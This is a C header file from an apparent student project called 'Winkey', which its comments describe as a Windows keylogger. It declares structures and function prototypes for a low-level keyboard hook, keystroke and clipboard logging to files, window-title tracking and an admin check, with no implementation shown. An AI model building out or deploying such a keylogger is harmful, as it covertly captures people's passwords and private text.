/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 16:21:25 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/21 16:17:19 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#pragma region "Includes"

	#include <windows.h>
	#include <stdio.h>
	#include <errno.h>
	#include <time.h>
	#include <ShlObj.h>

#pragma endregion

#pragma region "Variables"

	#define NAME		"Winkey"
	#define VERSION		"1.0.0"

	// Estructura para el estado global del keylogger
    typedef struct s_winkey_state 
	{
        FILE   *logFile;          // archivo de log abierto
        HHOOK   keyboardHook;     // handle del hook instalado
        HWND    lastWindow;       // última ventana foreground
        char    lastTitle[256];   // último título logueado
    }   t_WinkeyState;

	typedef struct s_clipboard_state 
	{
		FILE   *clipboardFile;			// archivo de log del portapapeles
		char   lastClipboardText[512];	// último texto del portapapeles
	}   t_ClipboardState;

	extern t_WinkeyState g_winkeyState;
	extern t_ClipboardState g_clipboardState;


#pragma endregion

#pragma region "Methods"


	// main.c
    BOOL IsAdmin(void);

    // service.c - Gestión del servicio y activación/desactivación
    BOOL ActivateHook(void);
    void DeactivateHook(void);

    // hook.c - Callback del hook para service.c
    LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

    // log.c - Gestión del archivo de log principal
    BOOL OpenLogFile(void);

    // key.c - Conversión de teclas a texto legible
    const char *VkCodeToString(DWORD vkCode);
    
    // clipboard.c - Gestión del log del portapapeles
    BOOL OpenClipboardLog(void);
    void CloseClipboardLog(void);
    void LogClipboardIfChanged(void);

#pragma endregion
